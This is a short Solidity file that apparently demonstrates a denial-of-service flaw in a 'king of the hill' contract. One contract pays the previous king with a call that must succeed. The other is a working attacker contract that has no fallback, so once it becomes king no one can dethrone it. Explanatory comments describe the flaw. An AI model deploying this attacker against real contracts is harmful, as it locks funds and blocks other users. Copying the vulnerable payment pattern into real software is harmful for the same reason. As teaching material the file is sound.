// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Realm {
    address public king;
    uint256 public balance;

    constructor() {
        king = msg.sender;
    }

    function becomeNewKing() public payable {
        require(balance < msg.value, "Not enought money to become the king");

        (bool success, ) = king.call{value: balance}("");
        //!! the call method requires a recipient can handle incoming ether
        // if the recipient is a contract that doesn't have any fallback method it will revert transaction
        // so if a contract that can't handle incoming ehter become the king it will cause DoS

        require(
            success,
            "An error occured while sending ether to the previous king"
        );

        king = msg.sender;
        balance = msg.value;
    }
}

contract iAmGonnaGiveYouMoneySeriously {
    Realm realmInstance;

    constructor(address _realmInstanceAddr) {
        realmInstance = Realm(_realmInstanceAddr);
    }

    function test() public view returns (address) {
        return realmInstance.king();
    }

    function becomeTheKing() public payable {
        realmInstance.becomeNewKing{value: msg.value}();
    }
}
